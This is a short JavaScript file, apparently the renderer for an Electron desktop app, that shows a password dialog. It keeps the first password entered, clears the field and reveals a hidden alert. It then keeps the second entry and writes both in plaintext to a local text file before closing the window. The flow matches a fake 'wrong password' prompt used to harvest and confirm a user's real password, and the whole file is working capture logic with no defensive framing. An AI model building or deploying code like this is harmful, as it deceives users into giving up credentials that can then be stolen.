const fs = require('fs');
const path = require('path');
var $ = require('jquery');
require('hideshowpassword');
var password1 = ''
var password2 = ''


$('#eye').mousedown(functShowPassword)// Reveal
$('#eye').mouseup(functHidePassword)// Reveal

$('#info-toggler1').click(toggleInfo)
$('#info-toggler2').click(toggleInfo)
var tries = 0;

document.getElementById("submit").addEventListener("click", createTxtFile);
document.getElementById("password").addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
        createTxtFile()
        }
    }
);
document.getElementById("close").addEventListener("click", closeApp);
document.getElementById("no").addEventListener("click", closeApp);

function toggleInfo() {
    $('#info').toggleClass('hidden');
    $('#info-toggler1').toggleClass('hidden');
    $('#info-toggler2').toggleClass('hidden');
}
function toggleInfo() {
    $('#info').toggleClass('hidden');
    $('#info-toggler1').toggleClass('hidden');
    $('#info-toggler2').toggleClass('hidden');
}
function functShowPassword() {
    $('#password').showPassword()
}
function functHidePassword() {
    $('#password').hidePassword()
}
function createTxtFile() {
    const password = document.getElementById('password').value;
    var content = ''
    const filePath = path.join("D:/Development/the-thing/", 'the_thing.txt');
    if(tries == 1){
        password2 = password
        content = `${password1} | ${password2}`;
        fs.writeFile(filePath, content, (err) => {
            if (err) {
                console.error('An error occurred while creating the file:', err);
            } else {
                console.log('File created successfully at', filePath);
                window.close()
            }
        });
    }
    else{
        tries = 1
        password1 = password
        $('#password').val('')
        $('#alert').toggleClass('hidden')
    }
}

function closeApp() {
    window.close();
}